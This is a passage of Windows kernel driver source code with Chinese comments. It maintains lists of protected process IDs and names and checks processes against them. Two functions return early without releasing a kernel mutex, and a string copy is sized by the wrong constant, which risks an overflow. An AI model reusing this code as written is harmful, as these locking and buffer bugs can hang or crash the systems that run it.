                // 如果找到了，就闪人了
                if (bIsFind)
                {
                        bResult = true ;
                        __leave ;
                }

                // 再查进程名是不是要保护的
                ntStatus = PsLookupProcessByProcessId(ClientId->UniqueProcess, &pEprocess) ;
                if (! NT_SUCCESS(ntStatus))
                {
                        pEprocess = NULL ;
                        __leave ;
                }
                pProcessName = PsGetProcessImageFileName((pEprocess)) ;
                KdPrint(((PCSTR)pProcessName)) ;
                KdPrint(("\r\n")) ;
                bIsFind = FindProtectProcessName(pProcessName) ;
                bResult = bIsFind ;                
        }

        __finally
        {
                if (NULL != pEprocess)
                {
                        ObDereferenceObject(pEprocess) ;
                        pEprocess = NULL ;
                }
        }
        return bResult ;
}

/*******************************************************************************
*
*   函 数 名 : AddProtectProcessPID
*  功能描述 : 添加需要保护的进程id
*  参数列表 : uPID             --    需要保护的进程id
*   说      明 : 
*  返回结果 :  成功返回true,失败返回false
*
*******************************************************************************/
bool AddProtectProcessPID(ULONG uPID)
{
        // 这里要考虑多线程问题
        KeWaitForSingleObject(&g_pde->MyThreadMutex,
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        if (g_uProtectProcessPIDCount + 1 >= uMaxProtectCount)
        {
                return false ;
        }
        g_ProtectProcessPID[g_uProtectProcessPIDCount] = uPID ;
        g_uProtectProcessPIDCount++ ;

        KeReleaseMutex(&g_pde->MyThreadMutex, FALSE) ;
        return true ;
}

/*******************************************************************************
*
*   函 数 名 : AddProtectProcessName
*  功能描述 : 添加需要保护的进程名
*  参数列表 : pProcessName             --    需要保护的进程名
*   说      明 : 
*  返回结果 :  成功返回true,失败返回false
*
*******************************************************************************/
bool AddProtectProcessName(PUCHAR pProcessName)
{
        // 这里要考虑多线程问题
        KeWaitForSingleObject(&g_pde->MyThreadMutex,
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        if (g_uProtectProcessCount + 1 >= uMaxProtectCount)
        {
                return false ;
        }
        if (NULL == pProcessName)
        {
                return false ;
        }

        strncpy((PCHAR)&g_ProtectProcess[g_uProtectProcessCount][0], (PCHAR)pProcessName, uMaxProtectCount - 1) ;
        g_uProtectProcessCount++ ;

        KeReleaseMutex(&g_pde->MyThreadMutex, FALSE) ;
        return true ;
}

/*******************************************************************************
*
*   函 数 名 : FindProtectProcessPID
*  功能描述 : 通过pid查找保护进程pid表，判断是否为要保护的进程id
*  参数列表 : uPID             --    进程pid
*   说      明 : 
*  返回结果 :  是否为需要保护的进程pid，是的话返回true,否则返回false
*
*******************************************************************************/
bool FindProtectProcessPID(ULONG uPID)
{
        // 向下取整
        uPID = uPID & ~3;
        for (ULONG i(0); i < g_uProtectProcessPIDCount; ++i)
        {
                if (uPID == g_ProtectProcessPID[i])
                {
                        return true ;
                }
        }
        return false ;
}

// 通过进程名查找保护进程名表，判断是否为要保护的进程名
/*******************************************************************************
*
*   函 数 名 : FindProtectProcessName
*  功能描述 : 通过进程名查找保护进程名表，判断是否为要保护的进程名
*  参数列表 : pProcessName             --    进程名
*   说      明 : 
*  返回结果 :  是否为需要保护的进程名，是的话返回true,否则返回false
*
*******************************************************************************/
bool FindProtectProcessName(PUCHAR pProcessName)
{
        if (NULL == pProcessName)
        {
                return false ;
        }

        for (ULONG i(0); i < g_uProtectProcessCount; ++i)
        {
                if(0 == strncmp((PCHAR)pProcessName, (PCHAR)g_ProtectProcess[i], MAX_PROTECT_NAME_LEN))
                {
                        return true ;
                }
        }
        return false ;
}

NTSTATUS Test(void)
{
        //KdBreakPoint() ;
        //InitializeKernelUserManage() ;

        //ULONG uUID = GetProcessUID(2336) ;

        //PUNICODE_STRING pustrUserName = GetUserNameByUID(uUID) ;
        //KdPrint(("%wZ\r\n", pustrUserName)) ;

        //ReleaseKernelUserManage() ;
        return STATUS_SUCCESS ;

}


//
// TODO: Add your module definitions here.
//



/* EOF */
